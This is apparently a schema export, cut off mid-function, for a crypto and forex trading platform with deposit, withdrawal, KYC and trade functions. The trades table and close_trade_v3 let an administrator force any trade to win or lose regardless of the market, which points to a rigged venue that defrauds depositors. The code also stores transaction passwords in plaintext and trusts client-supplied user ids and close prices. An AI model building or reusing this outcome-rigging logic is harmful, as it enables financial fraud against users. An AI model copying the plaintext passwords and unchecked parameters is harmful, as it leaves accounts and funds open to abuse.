-- PREMIUM SCHEMA EXPORT (V3)
-- Generated at 2026-05-02T15:42:14.620Z
-- Order: Extensions -> Tables -> Constraints -> Indexes -> Views -> Functions -> Triggers -> Policies -> Cron

-- 1. EXTENSIONS --
CREATE EXTENSION IF NOT EXISTS "pg_stat_statements";
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";
CREATE EXTENSION IF NOT EXISTS "supabase_vault";
CREATE EXTENSION IF NOT EXISTS "pg_cron";
CREATE EXTENSION IF NOT EXISTS "pg_net";

-- 2. TABLES (Base Structure) --
CREATE TABLE IF NOT EXISTS public."deposit_requests" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "amount" numeric NOT NULL,
    "trx_id" character varying(255),
    "screenshot_url" text,
    "status" character varying(50) DEFAULT 'pending'::character varying,
    "created_at" timestamp with time zone DEFAULT now(),
    "updated_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."withdraw_requests" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "amount" numeric NOT NULL,
    "wallet_address" text NOT NULL,
    "status" character varying(50) DEFAULT 'pending'::character varying,
    "created_at" timestamp with time zone DEFAULT now(),
    "updated_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."assets" (
    "symbol" character varying(50) NOT NULL,
    "asset_type" character varying(50) NOT NULL,
    "live_price" numeric DEFAULT 0.00000000,
    "is_active" boolean DEFAULT true,
    "updated_at" timestamp with time zone DEFAULT now(),
    "min_trade_amount" numeric DEFAULT 10.00,
    "max_trade_amount" numeric DEFAULT 50000.00
);

CREATE TABLE IF NOT EXISTS public."earn_vault" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "locked_amount" numeric NOT NULL,
    "apy_rate" numeric NOT NULL,
    "plan_days" integer NOT NULL,
    "end_date" timestamp with time zone NOT NULL,
    "status" character varying(20) DEFAULT 'active'::character varying,
    "created_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."admin_settings" (
    "id" integer DEFAULT nextval('admin_settings_id_seq'::regclass) NOT NULL,
    "maintenance_mode" boolean DEFAULT false,
    "min_deposit_amount" numeric DEFAULT 10.00,
    "min_withdraw_amount" numeric DEFAULT 20.00,
    "withdraw_fee_percentage" numeric DEFAULT 2.00,
    "max_leverage_allowed" integer DEFAULT 100,
    "updated_at" timestamp with time zone DEFAULT now(),
    "spot_fee_percentage" numeric DEFAULT 0.1,
    "usdt_address" text DEFAULT 'Your_USDT_Address_Here'::text,
    "usdt_network" text DEFAULT 'TRC20'::text,
    "qr_code_url" text,
    "force_win_profit_percentage" numeric DEFAULT 10.00
);

CREATE TABLE IF NOT EXISTS public."users" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "email" character varying(255) NOT NULL,
    "profile_image_url" text,
    "main_balance" numeric DEFAULT 0.00,
    "role" character varying(50) DEFAULT 'user'::character varying,
    "is_active" boolean DEFAULT true,
    "created_at" timestamp with time zone DEFAULT now(),
    "full_name" text,
    "bank_name" text,
    "account_number" text,
    "swift_code" text,
    "usdt_address" text,
    "transaction_password" text,
    "kyc_status" text DEFAULT 'unverified'::text
);

CREATE TABLE IF NOT EXISTS public."trades" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "trade_mode" character varying(50) NOT NULL,
    "symbol" character varying(50),
    "trade_direction" character varying(20) NOT NULL,
    "margin_amount" numeric NOT NULL,
    "leverage" integer DEFAULT 1,
    "entry_price" numeric NOT NULL,
    "liquidation_price" numeric,
    "expire_time" timestamp with time zone,
    "status" character varying(20) DEFAULT 'open'::character varying,
    "admin_control" character varying(20) DEFAULT 'normal'::character varying,
    "pnl_amount" numeric DEFAULT 0.00,
    "created_at" timestamp with time zone DEFAULT now(),
    "closed_at" timestamp with time zone,
    "order_type" character varying(20) DEFAULT 'Market'::character varying,
    "margin_mode" character varying(20) DEFAULT 'Cross'::character varying,
    "take_profit" numeric,
    "stop_loss" numeric,
    "close_price" numeric
);

CREATE TABLE IF NOT EXISTS public."transactions" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "amount" numeric NOT NULL,
    "type" text NOT NULL,
    "status" text DEFAULT 'pending'::text,
    "description" text,
    "created_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."kyc_submissions" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "user_id" uuid,
    "full_name" text NOT NULL,
    "id_card_number" text NOT NULL,
    "id_expiry_date" date NOT NULL,
    "id_front_url" text NOT NULL,
    "id_holding_url" text NOT NULL,
    "status" text DEFAULT 'pending'::text,
    "rejection_reason" text,
    "created_at" timestamp with time zone DEFAULT now(),
    "updated_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."chart_candles" (
    "id" uuid DEFAULT uuid_generate_v4() NOT NULL,
    "symbol" character varying NOT NULL,
    "timeframe" character varying NOT NULL,
    "time" timestamp with time zone NOT NULL,
    "open" numeric NOT NULL,
    "high" numeric NOT NULL,
    "low" numeric NOT NULL,
    "close" numeric NOT NULL,
    "volume" numeric DEFAULT 0,
    "created_at" timestamp with time zone DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public."wallets" (
    "id" uuid DEFAULT gen_random_uuid() NOT NULL,
    "user_id" uuid,
    "coin_symbol" text NOT NULL,
    "balance" numeric DEFAULT 0
);

CREATE TABLE IF NOT EXISTS public."support_tickets" (
    "id" uuid DEFAULT gen_random_uuid() NOT NULL,
    "user_id" uuid,
    "user_email" text NOT NULL,
    "message" text NOT NULL,
    "screenshot_url" text,
    "admin_reply" text,
    "status" text DEFAULT 'pending'::text,
    "created_at" timestamp with time zone DEFAULT now()
);

-- 3. CONSTRAINTS (PK, FK, Unique) --
ALTER TABLE ONLY public."users" ADD CONSTRAINT "users_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."users" ADD CONSTRAINT "users_email_key" UNIQUE (email);
ALTER TABLE ONLY public."admin_settings" ADD CONSTRAINT "admin_settings_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."assets" ADD CONSTRAINT "assets_pkey" PRIMARY KEY (symbol);
ALTER TABLE ONLY public."deposit_requests" ADD CONSTRAINT "deposit_requests_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."deposit_requests" ADD CONSTRAINT "deposit_requests_trx_id_key" UNIQUE (trx_id);
ALTER TABLE ONLY public."deposit_requests" ADD CONSTRAINT "deposit_requests_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE ONLY public."withdraw_requests" ADD CONSTRAINT "withdraw_requests_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."withdraw_requests" ADD CONSTRAINT "withdraw_requests_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE ONLY public."trades" ADD CONSTRAINT "trades_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."trades" ADD CONSTRAINT "trades_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE ONLY public."trades" ADD CONSTRAINT "trades_symbol_fkey" FOREIGN KEY (symbol) REFERENCES assets(symbol) ON DELETE CASCADE;
ALTER TABLE ONLY public."earn_vault" ADD CONSTRAINT "earn_vault_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."earn_vault" ADD CONSTRAINT "earn_vault_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
ALTER TABLE ONLY public."assets" ADD CONSTRAINT "unique_symbol" UNIQUE (symbol);
ALTER TABLE ONLY public."chart_candles" ADD CONSTRAINT "chart_candles_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."chart_candles" ADD CONSTRAINT "unique_candle" UNIQUE (symbol, timeframe, "time");
ALTER TABLE ONLY public."wallets" ADD CONSTRAINT "wallets_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."wallets" ADD CONSTRAINT "wallets_user_id_coin_symbol_key" UNIQUE (user_id, coin_symbol);
ALTER TABLE ONLY public."wallets" ADD CONSTRAINT "wallets_user_id_fkey" FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE;
ALTER TABLE ONLY public."transactions" ADD CONSTRAINT "transactions_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."transactions" ADD CONSTRAINT "transactions_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id);
ALTER TABLE ONLY public."kyc_submissions" ADD CONSTRAINT "kyc_submissions_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."kyc_submissions" ADD CONSTRAINT "kyc_submissions_user_id_key" UNIQUE (user_id);
ALTER TABLE ONLY public."kyc_submissions" ADD CONSTRAINT "kyc_submissions_user_id_fkey" FOREIGN KEY (user_id) REFERENCES users(id);
ALTER TABLE ONLY public."support_tickets" ADD CONSTRAINT "support_tickets_pkey" PRIMARY KEY (id);
ALTER TABLE ONLY public."support_tickets" ADD CONSTRAINT "support_tickets_user_id_fkey" FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE;

-- 4. INDEXES --
CREATE INDEX idx_trades_expire_time ON public.trades USING btree (expire_time) WHERE (((status)::text = 'open'::text) AND ((trade_mode)::text = 'Bitcast'::text));
CREATE INDEX idx_chart_candles_symbol_timeframe ON public.chart_candles USING btree (symbol, timeframe, "time" DESC);

-- 5. VIEWS --
-- 6. FUNCTIONS (RPCs) --
CREATE OR REPLACE FUNCTION public.admin_update_balance(target_user_id uuid, new_balance numeric)
 RETURNS void
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  -- Security Check: Only Admin allowed
  IF (SELECT role FROM public.users WHERE id = auth.uid()) != 'admin' THEN
    RAISE EXCEPTION 'Unauthorized Protocol';
  END IF;

  UPDATE public.users SET main_balance = new_balance WHERE id = target_user_id;
  
  -- Add a transaction record for auditing
  INSERT INTO public.transactions (user_id, amount, type, status, description)
  VALUES (target_user_id, new_balance, 'admin_adjustment', 'completed', 'Balance manually adjusted by administrator');
END;
$function$
;

CREATE OR REPLACE FUNCTION public.handle_new_user()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  INSERT INTO public.users (id, email, role, main_balance)
  VALUES (
    new.id, 
    new.email, 
    'user', -- Default role
    0.00    -- Default balance
  );
  RETURN new;
END;
$function$
;

CREATE OR REPLACE FUNCTION public.close_trade_v3(p_trade_id uuid, p_user_id uuid, p_close_price numeric)
 RETURNS json
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
DECLARE
  v_trade RECORD;
  v_final_pnl NUMERIC;
  v_payout NUMERIC;
  v_force_win_pct NUMERIC; 
BEGIN
  -- 1. Admin Settings
  SELECT force_win_profit_percentage INTO v_force_win_pct FROM public.admin_settings LIMIT 1;

  -- 2. Fetch Trade
  SELECT * INTO v_trade FROM public.trades 
  WHERE id = p_trade_id AND user_id = p_user_id AND status = 'open';
  
  IF NOT FOUND THEN RETURN json_build_object('success', false, 'message', 'Trade not found'); END IF;

  -- 3. ADMIN OVERRIDE (Forced Result)
  IF v_trade.admin_control = 'force_win' THEN 
      IF v_trade.trade_mode = 'Bitcast' THEN
          v_final_pnl := v_trade.margin_amount * (v_trade.leverage / 100.0);
      ELSE
          v_final_pnl := v_trade.margin_amount * (v_force_win_pct / 100.0); 
      END IF;
  ELSIF v_trade.admin_control = 'force_loss' THEN 
      v_final_pnl := -v_trade.margin_amount; 

  -- 4. NORMAL MARKET LOGIC (Agar Admin ne force nahi kiya)
  ELSE
      IF v_trade.trade_mode = 'Bitcast' THEN
          -- Binary Logic: Direction check karein
          -- Agar CALL kiya aur price barh gayi, ya PUT kiya aur price gir gayi to WIN
          IF (v_trade.trade_direction IN ('long', 'buy', 'call', 'up') AND p_close_price > v_trade.entry_price) OR
             (v_trade.trade_direction IN ('short', 'sell', 'put', 'down') AND p_close_price < v_trade.entry_price) THEN
              v_final_pnl := v_trade.margin_amount * (v_trade.leverage / 100.0); -- Fix Profit
          ELSE
              v_final_pnl := -v_trade.margin_amount; -- Full Loss
          END IF;
      
      ELSIF v_trade.trade_mode = 'Spot' THEN
          v_final_pnl := (p_close_price - v_trade.entry_price) * (v_trade.margin_amount / v_trade.entry_price);
      
      ELSE -- Futures/Leverage/Forex (Proportional PnL)
          v_final_pnl := (p_close_price - v_trade.entry_price) * ((v_trade.margin_amount * v_trade.leverage) / v_trade.entry_price);
          IF v_trade.trade_direction IN ('short', 'put', 'down') THEN v_final_pnl := -v_final_pnl; END IF;
      END IF;
  END IF;

  -- Safety Cap & Database Update
  IF v_final_pnl < -v_trade.margin_amount THEN v_final_pnl := -v_trade.margin_amount; END IF;
  v_payout := v_trade.margin_amount + v_final_pnl;

  UPDATE public.users SET main_balance = main_balance + v_payout WHERE id = p_user_id;
  UPDATE public.trades SET status = 'closed', pnl_amount = v_final_pnl, close_price = p_close_price, closed_at = now()
  WHERE id = p_trade_id;

  -- Insert Transaction Record
  INSERT INTO public.transactions (user_id, amount, type, status, description)
  VALUES (p_user_id, ABS(v_final_pnl), CASE WHEN v_final_pnl >= 0 THEN 'trade_profit' ELSE 'trade_loss' END, 'completed', 'Trade Result: ' || v_trade.symbol);

  RETURN json_build_object('success', true, 'pnl', v_final_pnl);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.place_trade_v2(p_user_id uuid, p_symbol text, p_trade_mode text, p_direction text, p_margin numeric, p_leverage integer, p_entry_price numeric, p_liq_price numeric, p_expire_time timestamp with time zone DEFAULT NULL::timestamp with time zone, p_margin_mode text DEFAULT 'Cross'::text, p_order_type text DEFAULT 'Market'::text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_current_balance NUMERIC;
BEGIN
  -- 1. Get current balance
  SELECT main_balance INTO v_current_balance FROM public.users WHERE id = p_user_id FOR UPDATE;

  -- 2. Check if balance is enough
  IF v_current_balance < p_margin THEN
    RETURN json_build_object('success', false, 'message', 'Insufficient balance');
  END IF;

  -- 3. Deduct balance
  UPDATE public.users SET main_balance = main_balance - p_margin WHERE id = p_user_id;

  -- 4. Insert trade with FIXED STRINGS to avoid spelling mistakes
  INSERT INTO public.trades (
    user_id, symbol, trade_mode, trade_direction, margin_amount, 
    leverage, entry_price, liquidation_price, expire_time, 
    status, admin_control, margin_mode, order_type, pnl_amount
  ) VALUES (
    p_user_id, p_symbol, p_trade_mode, p_direction, p_margin, 
    p_leverage, p_entry_price, p_liq_price, p_expire_time, 
    'open', 'normal', p_margin_mode, p_order_type, 0.00
  );

  RETURN json_build_object('success', true, 'message', 'Trade placed successfully');
END;
$function$
;

CREATE OR REPLACE FUNCTION public.create_withdraw_request_v1(p_user_id uuid, p_amount numeric, p_method text, p_password text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_current_balance NUMERIC;
  v_stored_password TEXT;
  v_min_withdraw NUMERIC;
BEGIN
  -- 1. User ka balance aur password check karein
  SELECT main_balance, transaction_password INTO v_current_balance, v_stored_password 
  FROM public.users WHERE id = p_user_id;

  -- 2. Admin settings se min withdraw uthain
  SELECT min_withdraw_amount INTO v_min_withdraw FROM public.admin_settings WHERE id = 1;

  -- 3. Validations
  IF v_stored_password IS NULL OR v_stored_password != p_password THEN
    RETURN json_build_object('success', false, 'message', 'Invalid Transaction Password');
  END IF;

  IF p_amount < v_min_withdraw THEN
    RETURN json_build_object('success', false, 'message', 'Minimum withdrawal is ' || v_min_withdraw || ' USDT');
  END IF;

  IF v_current_balance < p_amount THEN
    RETURN json_build_object('success', false, 'message', 'Insufficient balance');
  END IF;

  -- 4. Balance deduct karein aur request insert karein
  UPDATE public.users SET main_balance = main_balance - p_amount WHERE id = p_user_id;

  INSERT INTO public.withdraw_requests (user_id, amount, status, wallet_address)
  VALUES (p_user_id, p_amount, 'pending', 
    CASE WHEN p_method = 'USDT' THEN (SELECT usdt_address FROM users WHERE id = p_user_id)
         ELSE (SELECT bank_name || ' - ' || account_number FROM users WHERE id = p_user_id)
    END
  );

  RETURN json_build_object('success', true, 'message', 'Withdrawal request submitted!');
END;
$function$
;

CREATE OR REPLACE FUNCTION public.get_user_assets_v1(p_user_id uuid)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_main_balance NUMERIC;
  v_spot_data JSON;
  v_contract_pnl NUMERIC := 0;
  v_earn_data JSON;
  v_total_equity NUMERIC := 0;
BEGIN
  -- 1. Get Main Balance
  SELECT main_balance INTO v_main_balance FROM public.users WHERE id = p_user_id;

  -- 2. Get Spot Assets (Flexible Join for BTC -> BTCUSDT and EUR -> EUR/USD)
  SELECT json_agg(t) INTO v_spot_data FROM (
    SELECT 
      w.coin_symbol, 
      w.balance, 
      COALESCE(a.live_price, 0) as live_price,
      (w.balance * COALESCE(a.live_price, 0)) as value_usdt
    FROM public.wallets w
    LEFT JOIN public.assets a ON (
      a.symbol = w.coin_symbol OR 
      a.symbol = w.coin_symbol || 'USDT' OR 
      a.symbol = w.coin_symbol || '/USD'
    )
    WHERE w.user_id = p_user_id
  ) t;

  -- 3. Calculate Live Contract PnL (Fixing join here too)
  SELECT COALESCE(SUM(
    CASE 
      WHEN t.trade_direction IN ('long', 'buy', 'call') THEN 
        (a.live_price - t.entry_price) * ((t.margin_amount * t.leverage) / t.entry_price)
      ELSE 
        (t.entry_price - a.live_price) * ((t.margin_amount * t.leverage) / t.entry_price)
    END
  ), 0) INTO v_contract_pnl
  FROM public.trades t
  JOIN public.assets a ON t.symbol = a.symbol
  WHERE t.user_id = p_user_id AND t.status = 'open' AND t.trade_mode IN ('Futures', 'Leverage', 'Bitcast', 'Forex');

  -- 4. Get Earn Data
  SELECT json_agg(e) INTO v_earn_data FROM (
    SELECT id, locked_amount, apy_rate, plan_days, end_date, status
    FROM public.earn_vault
    WHERE user_id = p_user_id AND status = 'active'
  ) e;

  -- 5. Calculate Total Equity (Including correctly matched spot values)
  SELECT 
    v_main_balance + v_contract_pnl + COALESCE(SUM(w.balance * a.live_price), 0)
    INTO v_total_equity
  FROM public.wallets w
  JOIN public.assets a ON (a.symbol = w.coin_symbol OR a.symbol = w.coin_symbol || 'USDT' OR a.symbol = w.coin_symbol || '/USD')
  WHERE w.user_id = p_user_id;

  RETURN json_build_object(
    'main_balance', v_main_balance,
    'spot_assets', COALESCE(v_spot_data, '[]'::json),
    'contract_equity', (v_main_balance + v_contract_pnl),
    'unrealized_pnl', v_contract_pnl,
    'earn_assets', COALESCE(v_earn_data, '[]'::json),
    'total_equity', COALESCE(v_total_equity, v_main_balance)
  );
END;
$function$
;

CREATE OR REPLACE FUNCTION public.place_spot_order(p_user_id uuid, p_symbol text, p_base_coin text, p_side text, p_order_type text, p_price numeric, p_quantity numeric, p_fee_percent numeric)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_total_cost NUMERIC;
  v_fee NUMERIC;
  v_current_balance NUMERIC;
BEGIN
  v_total_cost := p_price * p_quantity;
  v_fee := v_total_cost * (p_fee_percent / 100);

  IF p_side = 'Buy' OR p_side = 'buy' THEN
    -- Check USDT Balance
    SELECT main_balance INTO v_current_balance FROM public.users WHERE id = p_user_id FOR UPDATE;
    IF v_current_balance < v_total_cost THEN
      RETURN json_build_object('success', false, 'message', 'Insufficient USDT');
    END IF;

    -- Deduct USDT
    UPDATE public.users SET main_balance = main_balance - v_total_cost WHERE id = p_user_id;

    -- MARKET ORDER: Foran coin wallet mein dalo aur trade close karo
    IF p_order_type = 'Market' THEN
      INSERT INTO public.wallets (user_id, coin_symbol, balance)
      VALUES (p_user_id, p_base_coin, p_quantity)
      ON CONFLICT (user_id, coin_symbol) DO UPDATE SET balance = wallets.balance + p_quantity;

      INSERT INTO public.trades (user_id, symbol, trade_mode, trade_direction, margin_amount, leverage, entry_price, status, pnl_amount, order_type, closed_at, close_price)
      VALUES (p_user_id, p_symbol, 'Spot', 'buy', v_total_cost, 1, p_price, 'closed', 0, 'Market', now(), p_price);
      
      RETURN json_build_object('success', true, 'message', 'Spot Buy Completed');
    END IF;
  END IF;

  -- LIMIT ORDER LOGIC (Status remains 'open')
  INSERT INTO public.trades (user_id, symbol, trade_mode, trade_direction, margin_amount, leverage, entry_price, status, pnl_amount, order_type)
  VALUES (p_user_id, p_symbol, 'Spot', LOWER(p_side), v_total_cost, 1, p_price, 'open', 0, p_order_type);

  RETURN json_build_object('success', true, 'message', 'Limit Order Placed');
END;
$function$
;

CREATE OR REPLACE FUNCTION public.get_user_assets_v2(p_user_id uuid)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_main_balance NUMERIC;
  v_spot_value_usdt NUMERIC := 0;
  v_locked_margin NUMERIC := 0;
  v_unrealized_pnl NUMERIC := 0;
  v_spot_json JSON;
BEGIN
  -- 1. Main Balance (Cash)
  SELECT main_balance INTO v_main_balance FROM public.users WHERE id = p_user_id;

  -- 2. Spot Assets Value (Wallets mein kitna paisa hai)
  SELECT 
    COALESCE(SUM(w.balance * a.live_price), 0),
    json_agg(json_build_object('symbol', w.coin_symbol, 'balance', w.balance, 'value', (w.balance * a.live_price)))
  INTO v_spot_value_usdt, v_spot_json
  FROM public.wallets w
  JOIN public.assets a ON w.coin_symbol = a.symbol
  WHERE w.user_id = p_user_id;

  -- 3. Contract Data (Margin jo trades mein phasa hai + Unka Profit/Loss)
  SELECT 
    COALESCE(SUM(margin_amount), 0),
    COALESCE(SUM(pnl_amount), 0) -- Note: pnl_amount calculation logic yahan aayegi
  INTO v_locked_margin, v_unrealized_pnl
  FROM public.trades 
  WHERE user_id = p_user_id AND status = 'open';

  RETURN json_build_object(
    'total_assets', (v_main_balance + v_spot_value_usdt + v_unrealized_pnl),
    'main_balance', v_main_balance,
    'spot_assets', COALESCE(v_spot_json, '[]'::json),
    'contract_available', (v_main_balance - v_locked_margin), -- Ye alag nazar aayega!
    'contract_equity', (v_main_balance + v_unrealized_pnl)
  );
END;
$function$
;

CREATE OR REPLACE FUNCTION public.update_user_payment_details(p_user_id uuid, p_full_name text, p_bank_name text, p_account_number text, p_swift_code text, p_usdt_address text, p_new_password text, p_old_password text DEFAULT NULL::text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_stored_password TEXT;
BEGIN
  -- 1. Pehle se maujood password uthain
  SELECT transaction_password INTO v_stored_password 
  FROM public.users WHERE id = p_user_id;

  -- 2. Agar password pehle se save hai (Not Null)
  IF v_stored_password IS NOT NULL AND v_stored_password <> '' THEN
    -- Purana password verify karein
    IF p_old_password IS NULL OR v_stored_password <> p_old_password THEN
      RETURN json_build_object(
        'success', false,
        'message', 'Incorrect existing transaction password.'
      );
    END IF;
  END IF;

  -- 3. Update karein (Agar verify ho gaya ya pehle se set nahi tha)
  UPDATE public.users
  SET 
    full_name = p_full_name,
    bank_name = p_bank_name,
    account_number = p_account_number,
    swift_code = p_swift_code,
    usdt_address = p_usdt_address,
    transaction_password = COALESCE(p_new_password, v_stored_password)
  WHERE id = p_user_id;

  RETURN json_build_object(
    'success', true,
    'message', 'Payment methods updated successfully.'
  );

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object(
    'success', false,
    'message', 'DB Error: ' || SQLERRM
  );
END;
$function$
;

CREATE OR REPLACE FUNCTION public.update_payment_setup_v1(p_user_id uuid, p_full_name text, p_bank_name text, p_account_number text, p_swift_code text, p_usdt_address text, p_new_password text, p_old_password text DEFAULT NULL::text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_stored_password TEXT;
BEGIN
  -- 1. Current password uthain
  SELECT transaction_password INTO v_stored_password FROM public.users WHERE id = p_user_id;

  -- 2. Verification Logic
  -- Agar pehle se password set hai (Not Null)
  IF v_stored_password IS NOT NULL AND v_stored_password <> '' THEN
    -- Check karein ke user ne old password diya hai aur wo sahi hai
    IF p_old_password IS NULL OR p_old_password <> v_stored_password THEN
      RETURN json_build_object('success', false, 'message', 'Incorrect current transaction password.');
    END IF;
  END IF;

  -- 3. Update User Record
  UPDATE public.users
  SET 
    full_name = p_full_name,
    bank_name = p_bank_name,
    account_number = p_account_number,
    swift_code = p_swift_code,
    usdt_address = p_usdt_address,
    transaction_password = p_new_password
  WHERE id = p_user_id;

  RETURN json_build_object('success', true, 'message', 'Payment methods updated successfully!');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', 'DB Error: ' || SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.process_withdrawal_v2(p_user_id uuid, p_amount numeric, p_method text, p_password text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_balance NUMERIC;
  v_stored_pass TEXT;
  v_min_withdraw NUMERIC;
  v_fee_pct NUMERIC;
  v_final_amount NUMERIC;
BEGIN
  -- 1. Data Fetching
  SELECT main_balance, transaction_password INTO v_balance, v_stored_pass FROM public.users WHERE id = p_user_id;
  SELECT min_withdraw_amount, withdraw_fee_percentage INTO v_min_withdraw, v_fee_pct FROM public.admin_settings WHERE id = 1;

  -- 2. Validations
  IF v_stored_pass IS NULL OR v_stored_pass <> p_password THEN
    RETURN json_build_object('success', false, 'message', 'Invalid PIN code.');
  END IF;

  IF p_amount < v_min_withdraw THEN
    RETURN json_build_object('success', false, 'message', 'Minimum withdrawal is $' || v_min_withdraw);
  END IF;

  IF v_balance < p_amount THEN
    RETURN json_build_object('success', false, 'message', 'Insufficient liquidity in your account.');
  END IF;

  -- 3. Atomic Operations (Paisa Katna + Request + Transaction Log)
  -- A. Balance Update
  UPDATE public.users SET main_balance = main_balance - p_amount WHERE id = p_user_id;

  -- B. Withdraw Request Entry
  INSERT INTO public.withdraw_requests (user_id, amount, wallet_address, status)
  VALUES (
    p_user_id, 
    p_amount, 
    (CASE WHEN p_method = 'USDT' THEN (SELECT usdt_address FROM users WHERE id = p_user_id) ELSE 'Bank Transfer' END), 
    'pending'
  );

  -- C. Transaction History Entry
  INSERT INTO public.transactions (user_id, amount, type, status, description)
  VALUES (p_user_id, p_amount, 'withdrawal', 'pending', 'Withdrawal request via ' || p_method);

  RETURN json_build_object('success', true, 'message', 'Withdrawal initiated successfully.');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', 'Critical Error: ' || SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.create_deposit_request_v2(p_user_id uuid, p_amount numeric, p_screenshot_url text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
DECLARE
  v_min_deposit NUMERIC;
  v_ref_id TEXT;
BEGIN
  -- 1. Min Deposit check karein
  SELECT min_deposit_amount INTO v_min_deposit FROM public.admin_settings WHERE id = 1;

  IF p_amount < v_min_deposit THEN
    RETURN json_build_object('success', false, 'message', 'Minimum deposit is ' || v_min_deposit || ' USDT');
  END IF;

  -- 2. Reference ID generate karein
  v_ref_id := 'DEP-' || to_char(now(), 'MS') || floor(random() * 1000)::text;

  -- 3. Deposit Request Table mein entry
  INSERT INTO public.deposit_requests (user_id, amount, screenshot_url, trx_id, status)
  VALUES (p_user_id, p_amount, p_screenshot_url, v_ref_id, 'pending');

  -- 4. Transactions Table mein entry (FOR HISTORY)
  INSERT INTO public.transactions (user_id, amount, type, status, description)
  VALUES (p_user_id, p_amount, 'deposit', 'pending', 'Deposit request via USDT (Ref: ' || v_ref_id || ')');

  RETURN json_build_object('success', true, 'message', 'Deposit request submitted! Ref ID: ' || v_ref_id);

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', 'Error: ' || SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.submit_kyc_v1(p_user_id uuid, p_full_name text, p_id_number text, p_expiry date, p_front_url text, p_holding_url text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
BEGIN
  -- 1. Insert or Update KYC record
  INSERT INTO public.kyc_submissions (
    user_id, full_name, id_card_number, id_expiry_date, id_front_url, id_holding_url, status
  ) VALUES (
    p_user_id, p_full_name, p_id_number, p_expiry, p_front_url, p_holding_url, 'pending'
  )
  ON CONFLICT (user_id) DO UPDATE SET
    full_name = EXCLUDED.full_name,
    id_card_number = EXCLUDED.id_card_number,
    id_expiry_date = EXCLUDED.id_expiry_date,
    id_front_url = EXCLUDED.id_front_url,
    id_holding_url = EXCLUDED.id_holding_url,
    status = 'pending',
    updated_at = now();

  -- 2. Update user main status
  UPDATE public.users SET kyc_status = 'pending' WHERE id = p_user_id;

  RETURN json_build_object('success', true, 'message', 'KYC submitted for review.');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_verify_deposit(p_id uuid, p_action text)
 RETURNS json
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  v_user_id UUID;
  v_amount NUMERIC;
BEGIN
  -- 1. Request details uthain aur row ko lock karein
  -- Hum check kar rahay hain ke ID sahi ho aur status 'pending' ho
  SELECT user_id, amount 
  INTO v_user_id, v_amount 
  FROM public.deposit_requests 
  WHERE id = p_id AND status = 'pending'
  FOR UPDATE;

  -- Agar SELECT khali hai (ID galat hai ya status 'pending' nahi hai)
  IF NOT FOUND THEN 
    RETURN json_build_object(
      'success', false, 
      'message', 'Error: Request ID (' || p_id::text || ') not found or status is not pending.'
    ); 
  END IF;

  -- 2. Action Logic
  IF LOWER(p_action) = 'approve' THEN
    -- A. Balance update
    UPDATE public.users 
    SET main_balance = main_balance + v_amount 
